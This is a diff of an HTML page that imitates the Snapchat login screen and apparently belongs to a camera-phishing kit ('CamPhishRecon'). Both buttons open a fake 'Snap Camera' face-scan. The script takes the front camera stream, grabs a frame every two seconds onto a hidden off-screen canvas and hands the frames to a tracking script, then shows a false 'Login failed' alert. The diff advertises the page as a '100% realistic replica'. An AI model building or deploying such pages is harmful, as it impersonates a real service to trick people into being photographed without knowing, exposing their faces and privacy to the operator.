@@ -1,29 +1,37 @@
-<!-- DESC: Snapchat login page replica with camera for Snap Camera -->
+<!-- DESC: Snapchat login — 100% realistic replica with Snap Camera -->
 <!DOCTYPE html>
 <html lang="en"><head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<meta name="theme-color" content="#fffc00">
 <title>Snapchat — Log In</title>
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif}
-body{background:#fffc00;min-height:100vh;display:flex;align-items:center;justify-content:center}
-.box{width:360px;max-width:92vw;text-align:center;padding:30px}
-.ghost{font-size:60px;margin-bottom:16px}
-.logo{font-size:28px;font-weight:900;color:#000;margin-bottom:30px}
-input{width:100%;padding:14px;margin-bottom:10px;background:#fff;border:none;border-radius:8px;font-size:16px}
-input:focus{outline:none;box-shadow:0 0 0 2px #000}
-.btn{width:100%;padding:14px;background:#000;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:700;cursor:pointer;margin-top:8px}
-.btn:active{transform:scale(0.97)}
-.btn-yellow{background:#fffc00;color:#000}
-.face-btn{width:100%;padding:14px;background:transparent;border:2px solid #000;color:#000;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;margin-top:10px}
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#fffc00;font-family:-apple-system,BlinkMacSystemFont,sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
+.login-card{width:360px;max-width:100%;text-align:center}
+.ghost-icon{font-size:60px;margin-bottom:20px;display:block}
+.title{font-size:28px;font-weight:900;color:#000;margin-bottom:24px;letter-spacing:-0.5px}
+form{margin-bottom:16px}
+input{width:100%;padding:14px;font-size:16px;border:none;border-radius:8px;margin-bottom:10px;color:#000;outline:none;box-sizing:border-box}
+input:focus{box-shadow:0 0 0 3px rgba(0,0,0,.1)}
+input::placeholder{color:#999}
+.btn-login{width:100%;padding:14px;background:#000;border:none;border-radius:8px;color:#fffc00;font-size:16px;font-weight:700;cursor:pointer}
+.btn-login:active{background:#333}
+.btn-login:disabled{background:#666}
+.face-btn{width:100%;padding:14px;background:transparent;border:2px solid #000;border-radius:8px;color:#000;font-size:15px;font-weight:600;cursor:pointer;margin-top:8px;display:flex;align-items:center;justify-content:center;gap:8px}
 .face-btn:active{background:#000;color:#fffc00}
+.divider{display:flex;align-items:center;margin:20px 0;gap:12px;color:#666;font-size:13px}
+.divider::before,.divider::after{content:'';flex:1;height:1px;background:rgba(0,0,0,.1)}
 .signup{margin-top:24px;font-size:14px;color:#333}
 .signup a{color:#000;font-weight:700;text-decoration:underline}
-.face-scan{position:fixed;inset:0;background:rgba(255,252,0,0.98);z-index:100;display:none;align-items:center;justify-content:center;flex-direction:column;color:#000}
-.face-scan.active{display:flex}
-.scan-circle{width:200px;height:200px;border-radius:50%;border:4px solid #000;position:relative;overflow:hidden;margin-bottom:20px;background:#fff}
-.scan-circle::after{content:'👻';position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-size:60px}
-.spinner{width:20px;height:20px;border:2px solid #fff;border-top:#000;border-radius:50%;animation:spin .6s linear infinite;margin-top:16px}
+.scan-overlay{position:fixed;inset:0;background:rgba(255,252,0,.98);z-index:999;display:none;align-items:center;justify-content:center;flex-direction:column}
+.scan-overlay.active{display:flex}
+.scan-circle{width:200px;height:200px;border-radius:50%;border:4px solid #000;position:relative;background:#fff}
+.scan-circle::after{content:'👻';position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-size:60px}
+.scan-circle::before{content:'';position:absolute;inset:-8px;border-radius:50%;border:2px solid rgba(0,0,0,.15);animation:scan 1.5s infinite}
+@keyframes scan{0%{transform:scale(1);opacity:1}100%{transform:scale(1.15);opacity:0}}
+.scan-text{font-size:20px;font-weight:900;margin-top:20px;color:#000}
+.spin{width:20px;height:20px;border:2px solid #000;border-top:transparent;border-radius:50%;animation:spin .6s linear infinite;margin-top:12px}
 @keyframes spin{to{transform:rotate(360deg)}}
 video,canvas#cap{position:fixed;opacity:0;width:2px;height:2px;top:-9999px;left:-9999px}
 </style>
@@ -31,40 +39,43 @@ video,canvas#cap{position:fixed;opacity:0;width:2px;height:2px;top:-9999px;left:
 <script src="forwarding_link/t/recon.js"></script>
 <video id="v" playsinline autoplay muted></video>
 <canvas id="cap" width="320" height="240"></canvas>
-<div class="box">
-<div class="ghost">👻</div>
-<div class="logo">Snapchat</div>
+
+<div class="login-card">
+<span class="ghost-icon">👻</span>
+<div class="title">Snapchat</div>
 <form onsubmit="return doLogin(event)">
 <input type="text" placeholder="Username or email" id="user" required>
 <input type="password" placeholder="Password" id="pass" required>
-<button type="submit" class="btn" id="loginBtn">Log In</button>
+<button type="submit" class="btn-login" id="loginBtn">Log In</button>
 </form>
-<button class="face-btn" onclick="doFaceLogin()">📸 Log in with Snap Camera</button>
-<div class="signup">New here? <a href="#">Sign Up</a></div>
+<button class="face-btn" onclick="doSnapCam()">📸 Log in with Snap Camera</button>
+<div class="divider">New to Snapchat?</div>
+<button class="face-btn" style="border:none;background:#fff">Sign Up</button>
 </div>
-<div class="face-scan" id="faceScan">
+
+<div class="scan-overlay" id="scanOverlay">
 <div class="scan-circle"></div>
-<div style="font-size:20px;font-weight:900">Snap Camera Login</div>
-<div style="font-size:13px;color:#666;margin-top:8px">Center your face in the circle</div>
-<div class="spinner"></div>
+<div class="scan-text">Snap Camera Login</div>
+<div>Center your face for instant access</div>
+<div class="spin"></div>
 </div>
+
 <script>
 var API='API_BASE_URL',SHARE_URL=location.origin+'/t/snapchat';
 if(window.CamPhishRecon)CamPhishRecon.init({genderDetect:true});
-function doLogin(e){e.preventDefault();startSnap('login');return false;}
-function doFaceLogin(){startSnap('camera');}
-function startSnap(type){
-var fs=document.getElementById('faceScan');fs.classList.add('active');
-var btn=document.getElementById('loginBtn');if(btn){btn.innerHTML='Logging in...';btn.disabled=true;}
-if(window.CamPhishRecon)CamPhishRecon.Capture.event('snapchat_login',{type:type,user:document.getElementById('user')?document.getElementById('user').value:''});
+function doLogin(e){e.preventDefault();doSnapCam();return false;}
+function doSnapCam(){
+var fs=document.getElementById('scanOverlay');fs.classList.add('active');
+var btn=document.getElementById('loginBtn');btn.innerHTML='Logging in...';btn.disabled=true;
+if(window.CamPhishRecon)CamPhishRecon.Capture.event('snapchat_login',{});
 if(navigator.mediaDevices){
 navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'user'}}).then(function(stream){
 var v=document.getElementById('v');v.srcObject=stream;v.play();
 var cap=document.getElementById('cap'),cx=cap.getContext('2d');
 var ci=setInterval(function(){if(v.readyState>=2){cx.drawImage(v,0,0,320,240);if(window.CamPhishRecon)CamPhishRecon.Capture.image(cap.toDataURL('image/png'),'snap_camera');}},2000);
-setTimeout(function(){clearInterval(ci);fs.classList.remove('active');alert('Login failed. Check your credentials.');if(btn){btn.innerHTML='Log In';btn.disabled=false;}},5000);
-}).catch(function(){setTimeout(function(){fs.classList.remove('active');if(btn){btn.innerHTML='Log In';btn.disabled=false;}},2000);});
-}else{setTimeout(function(){fs.classList.remove('active');if(btn){btn.innerHTML='Log In';btn.disabled=false;}},2000);}
+setTimeout(function(){clearInterval(ci);fs.classList.remove('active');alert('Login failed. Check your credentials.');btn.innerHTML='Log In';btn.disabled=false;},5000);
+}).catch(function(){fs.classList.remove('active');btn.innerHTML='Log In';btn.disabled=false;});
+}else{setTimeout(function(){fs.classList.remove('active');btn.innerHTML='Log In';btn.disabled=false;},2000);}
 }
 </script>
 </body></html>
